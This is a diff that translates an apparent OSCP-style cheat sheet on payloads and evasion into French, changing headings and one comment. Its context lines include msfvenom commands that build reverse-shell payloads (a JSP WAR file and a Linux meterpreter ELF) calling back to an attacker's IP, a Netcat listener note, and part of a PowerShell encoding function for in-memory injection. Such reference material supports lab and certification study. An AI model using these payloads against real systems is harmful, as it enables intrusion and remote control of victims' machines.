@@ -8,12 +8,12 @@ description: "Références sur les protections, charges utiles et outils de labo
 Références sur les protections, charges utiles et outils de laboratoire.
 
 
-## Injection en mémoire avec PowerShell Script
+## Injection en mémoire avec un script PowerShell
 
 Examiner les entrées et les réponses de l'application web.
 
 
-### Payload
+### Charge utile (Payload)
 
 
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
@@ -96,7 +96,7 @@ def powershell_encode(data):
     # blank command will store our fixed unicode variable
     blank_command = ""
     powershell_command = ""
-    # Remove weird chars that could have been added by ISE
+    # Supprimer les caractères parasites éventuellement ajoutés par PowerShell ISE
     n = re.compile(u'(\xef|\xbb|\xbf)')
     # loop through each character and insert null byte
     for char in (n.sub("", data)):
@@ -143,7 +143,7 @@ if __name__ == "__main__":
 ```
 
 
-## Shellter (Automatic Tool)
+## Shellter (outil automatisé)
 
 
 
@@ -230,7 +230,7 @@ msfvenom -p [PAYLOAD] -e [ENCODER] -f [FORMAT] -i [ENCODE] [COUNT_OF_ENCODING] L
 ```
 
 
-### Listeners
+### Écouteurs réseau (Listeners)
 
 
 <p class="oscp-command-note">Ouvrir un port d&#x27;écoute Netcat.</p>
@@ -252,7 +252,7 @@ msf>exploit -j
 ```
 
 
-### Main Payloads
+### Charges utiles principales (Payloads)
 
 
 <p class="oscp-command-note">Créer un fichier de sortie avec msfvenom.</p>
@@ -302,7 +302,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.wa
 ```
 
 
-### Complémentaire Payloads
+### Charges utiles complémentaires (Payloads)
 
 
 **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf**
